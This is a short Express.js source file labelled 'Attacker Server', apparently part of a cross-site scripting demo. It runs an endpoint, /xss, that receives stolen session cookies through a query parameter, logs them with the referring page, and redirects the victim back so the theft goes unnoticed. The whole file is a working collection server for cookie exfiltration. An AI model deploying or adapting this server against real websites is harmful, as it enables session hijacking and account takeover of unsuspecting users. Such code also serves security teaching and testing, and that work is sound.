import express from 'express';
import logCookie from './logger';

const app = express();
const port = 4000;

app.get('/xss', (req, res) => {
    const cookieValue = req.query.cookie; 
    const referer = req.headers.referer;
    if(cookieValue && referer ){
        logCookie(cookieValue.toString(), referer)
        console.log('Received cookie:', cookieValue); 
        res.redirect(referer);
    }
})

app.get("/", (req, res) => {
    res.send('Attacker Server');
});

app.listen(port, () => {
    console.log(`Attacker server is running on port http://localhost:${port}`);
});
